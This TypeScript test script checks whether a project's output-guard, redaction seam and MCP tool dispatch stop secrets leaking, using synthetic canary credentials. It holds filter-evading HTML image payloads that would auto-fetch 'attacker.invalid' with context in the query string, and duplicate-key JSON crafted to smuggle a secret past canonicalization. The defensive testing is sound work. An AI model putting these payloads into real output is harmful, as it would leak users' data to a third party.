// T42 — the three repairs at the REAL public boundaries: dispatchCallTool (MCP
// transport), prepareOutputForPersistence (durable-sink materializer),
// redactToolOutput (MCP compatibility seam) and guardOutput (the end-to-end
// write seam). Read-only, synthetic only, advisory redaction OFF so what is
// measured is the MANDATORY floor.
//
// Usage: bun T42-boundary.ts <out.json>
import { guardOutput, prepareOutputForPersistence, type GuardResult } from "../../../../src/security/guard";
import { validateSerializedOutput } from "../../../../src/security/service";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";

const S = ["AKIA", "IOSFODNN7EXAMPLE"].join("");
const CRED = "tr0ub4dor-correct-horse";
const ATT = "attacker.invalid";
const BS = String.fromCharCode(92);

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// ── ROW 1: the auto-fetch vectors T42 found, at every boundary ──────────────
const exfilShapes: Record<string, string> = {
  gtInEarlierAttribute: `<img alt="a>b" src="https://${ATT}/p?x=ctx">`,
  decoySrcInAttribute: `<img alt="src=/safe" src="https://${ATT}/p?x=ctx">`,
  decoySrcThenGt: `<img data-note="see src=/a.png for details" src="https://${ATT}/p?x=ctx">`,
  gtInEarlierAttributeSrcset: `<img alt="a>b" srcset="https://${ATT}/p?x=ctx 1x">`,
  imageAliasGt: `<image alt="a>b" src="https://${ATT}/p?x=ctx">`,
  schemeNoSlashes: `<img src="https:${ATT}/p?x=ctx">`,
  // controls: the classes T40 closed must stay closed
  ctlBackslash: `<img src="${BS}${BS}${ATT}/p?x=ctx">`,
  ctlImageTag: `<image src="https://${ATT}/p?x=ctx">`,
  ctlPublicLink: "[public documentation](https://docs.example.org/guide)",
};

const exfilPersistence = Object.fromEntries(
  Object.entries(exfilShapes).map(([name, note]) => {
    const serialized = JSON.stringify({ note });
    const r = prepareOutputForPersistence(pass, serialized);
    return [
      name,
      r.allowed
        ? {
            allowed: true,
            leaksHost: r.content.includes(ATT),
            bytesIdenticalToInput: r.content === serialized,
            redaction: r.redaction,
            bytesPreserved: r.bytesPreserved,
          }
        : { allowed: false, reason: r.reason },
    ];
  }),
);

const exfilSeam = Object.fromEntries(
  await Promise.all(
    Object.entries(exfilShapes).map(async ([name, note]) => {
      const serialized = JSON.stringify({ note });
      const text = await redactToolOutput(process.cwd(), serialized);
      return [name, { identicalToInput: text === serialized, leaksHost: text.includes(ATT) }];
    }),
  ),
);

// ── ROW 2: byte-faithful canonicalization, attacked ─────────────────────────
// Duplicate-member shapes the earlier rounds did NOT use, plus spellings that
// are faithful in VALUE but not in BYTES.
const deepDuplicate = (() => {
  let inner = `{"k":"${S}","k":"safe"}`;
  for (let i = 0; i < 5; i += 1) inner = `{"lvl${i}":[${inner}]}`;
  return inner;
})();

const serializedShapes: Record<string, string> = {
  // duplicates in shapes the earlier reviews did not use
  dupSameValue: `{"a":"safe","a":"safe"}`,
  dupObjectSurvivor: `{"a":{"b":"${S}"},"a":{"b":"safe"}}`,
  dupArraySurvivor: `{"a":["${CRED}"],"a":["safe"]}`,
  dupEscapedKeyFirst: `{"\\u0061":"${S}","a":"safe"}`,
  dupEscapedKeySecond: `{"a":"${S}","\\u0061":"safe"}`,
  dupProtoKey: `{"__proto__":"${S}","__proto__":"safe"}`,
  dupEmptyKey: `{"":"${CRED}","":"safe"}`,
  dupDepth6InArray: deepDuplicate,
  dupNegativeZeroPair: `{"a":0,"a":-0}`,
  dupNumberSpelling: `{"a":1,"a":1.0}`,
  dupLastMember: `{"x":1,"a":"${S}","a":"safe"}`,
  dupWithNewlines: `{\n  "a": "${S}",\n  "a": "safe"\n}`,
  dupKeyIsSecretName: `{"${S}":"x","${S}":"y"}`,
  dupSurvivorNumericCredential: `{"password":"${CRED}","password":1}`,
  // faithful in value, not in bytes — must now be byte-preserved, state none
  bigInteger: `{"n":12345678901234567890}`,
  negativeZero: `{"delta":-0,"other":[-0]}`,
  exponent: `{"n":1e3}`,
  trailingZero: `{"n":1.0}`,
  plusExponent: `{"n":1E+2}`,
  unicodeEscape: `{"s":"em \\u2014 dash"}`,
  goStyleEscape: `{"s":"\\u003ca\\u003e \\u0026 b"}`,
  solidusEscape: `{"s":"a\\/b"}`,
  integerLikeKeyOrder: `{"2":"b","1":"a"}`,
  surrogatePair: `{"s":"\\ud83d\\ude00"}`,
  loneSurrogate: `{"s":"\\ud800"}`,
  emptyKeyClean: `{"":"value"}`,
  protoKeyClean: `{"__proto__":{"a":1}}`,
  prettyPrinted: JSON.stringify({ id: "safe-id", count: 12 }, null, 2),
  tabIndented: JSON.stringify({ id: "safe-id", count: 12 }, null, "\t"),
  leadTrailWhitespace: `  {"a":1}  `,
  topLevelScalar: `"just a string"`,
  topLevelNumber: `12345678901234567890`,
  emptyObject: `{}`,
  emptyArray: `[]`,
  nonJsonProse: `token=raw and some prose`,
  deepNest2000: `${"[".repeat(2000)}1${"]".repeat(2000)}`,
  deepNest200: `${"[".repeat(200)}1${"]".repeat(200)}`,
};

const serialized = Object.fromEntries(
  Object.entries(serializedShapes).map(([name, input]) => {
    const r = validateSerializedOutput(input);
    return [
      name,
      r.ok
        ? {
            ok: true,
            state: r.redaction.state,
            reasons: r.redaction.reasons,
            bytesPreserved: r.text === input,
            leaksSecret: r.text.includes(S),
            leaksCred: r.text.includes(CRED),
            // a value-faithfulness oracle independent of the implementation
            sameParse:
              (() => {
                try {
                  return JSON.stringify(JSON.parse(r.text)) === JSON.stringify(JSON.parse(input));
                } catch {
                  return null;
                }
              })(),
            text: r.text.length > 200 ? `${r.text.slice(0, 200)}…` : r.text,
          }
        : { ok: false, state: r.redaction.state, reasons: r.redaction.reasons, text: r.text },
    ];
  }),
);

// ── ROW 3: can a caller distinguish the three outcomes? ─────────────────────
const cleanPayload = JSON.stringify({ id: "safe-id", count: 12 });
const maskedPayload = JSON.stringify({ note: `key ${S} here` });
const duplicatePayload = `{"a":"${S}","a":"safe"}`;

function materializerRow(guard: GuardResult, original: string) {
  const r = prepareOutputForPersistence(guard, original);
  return r.allowed
    ? {
        allowed: true,
        state: r.redaction.state,
        reasons: r.redaction.reasons,
        bytesPreserved: r.bytesPreserved,
        leaksSecret: r.content.includes(S),
        contentEqualsOriginal: r.content === original,
      }
    : { allowed: false, reason: r.reason, redaction: (r as { redaction?: unknown }).redaction };
}

// (a) hand-built GuardResult with `redacted` unset — the floor runs once
const handBuilt = {
  bytesPreserved: materializerRow(pass, cleanPayload),
  contentMasked: materializerRow(pass, maskedPayload),
  duplicateDropped: materializerRow(pass, duplicatePayload),
  numericUnderCredentialKey: materializerRow(pass, `{"password":123456789}`),
};

// (b) the REAL end-to-end path: guardOutput() first, then the materializer
const cwd = process.cwd();
const endToEnd: Record<string, unknown> = {};
for (const [name, original] of [
  ["bytesPreserved", cleanPayload],
  ["contentMasked", maskedPayload],
  ["duplicateDropped", duplicatePayload],
  ["exfilHostMasked", JSON.stringify({ note: `<img src="https://${ATT}/p">` })],
] as const) {
  const guard = await guardOutput({ cwd, content: original, target: "memory" });
  endToEnd[name] = {
    guardAllowed: guard.allowed,
    guardRedactedDiffers: (guard.redacted ?? original) !== original,
    ...materializerRow(guard, original),
  };
}

// Can a caller tell the three apart, on each path?
const signalMatrix = {
  handBuilt: {
    bytesPreserved: `${handBuilt.bytesPreserved.state}/${JSON.stringify(handBuilt.bytesPreserved.reasons)}/bp=${handBuilt.bytesPreserved.bytesPreserved}`,
    contentMasked: `${handBuilt.contentMasked.state}/${JSON.stringify(handBuilt.contentMasked.reasons)}/bp=${handBuilt.contentMasked.bytesPreserved}`,
    duplicateDropped: `${handBuilt.duplicateDropped.state}/${JSON.stringify(handBuilt.duplicateDropped.reasons)}/bp=${handBuilt.duplicateDropped.bytesPreserved}`,
  },
  endToEnd: Object.fromEntries(
    Object.entries(endToEnd).map(([k, v]) => {
      const r = v as { state?: string; reasons?: string[]; bytesPreserved?: boolean };
      return [k, `${r.state}/${JSON.stringify(r.reasons)}/bp=${r.bytesPreserved}`];
    }),
  ),
};

// ── MCP transport ───────────────────────────────────────────────────────────
const tool = (name: string, invoke: () => Promise<unknown>) => ({
  name,
  module: "standard" as const,
  description: name,
  inputSchema: { type: "object" },
  mutating: false,
  invoke,
});

const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF: the floor must still apply
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(exfilShapes).map(([name, note]) =>
    tool(`p.${name}`, async () => ({ note })),
  ),
};

const mcp: Record<string, unknown> = {};
for (const name of Object.keys(exfilShapes)) {
  const r = await dispatchCallTool(ctx, `p.${name}`, {});
  const whole = JSON.stringify(r);
  mcp[name] = {
    isError: r.isError,
    redaction: r.redaction,
    leaksHost: whole.includes(ATT),
  };
}

const report = { exfilPersistence, exfilSeam, mcp, serialized, handBuilt, endToEnd, signalMatrix };
const out = process.argv[2];
if (out) await Bun.write(out, JSON.stringify(report, null, 2));

console.log("== ROW 1: auto-fetch at the boundaries ==");
for (const name of Object.keys(exfilShapes)) {
  const m = mcp[name] as { isError: boolean; redaction: { state: string; reasons: string[] }; leaksHost: boolean };
  const p = exfilPersistence[name] as { leaksHost?: boolean; bytesIdenticalToInput?: boolean };
  const s = exfilSeam[name] as { leaksHost: boolean };
  console.log(
    `${name}: mcp isError=${m.isError} state=${m.redaction?.state} reasons=${JSON.stringify(m.redaction?.reasons)} leaksHost=${m.leaksHost} | persist leaksHost=${p.leaksHost} identical=${p.bytesIdenticalToInput} | seam leaksHost=${s.leaksHost}`,
  );
}
console.log("\n== ROW 2: serialized shapes ==");
for (const [name, v] of Object.entries(serialized)) {
  const r = v as Record<string, unknown>;
  console.log(
    `${name}: ok=${r.ok} state=${r.state} reasons=${JSON.stringify(r.reasons)} bytesPreserved=${r.bytesPreserved} sameParse=${r.sameParse} leaksSecret=${r.leaksSecret} leaksCred=${r.leaksCred}`,
  );
}
console.log("\n== ROW 3: persistence signal ==");
console.log(JSON.stringify(signalMatrix, null, 2));
console.log(JSON.stringify(handBuilt.numericUnderCredentialKey));
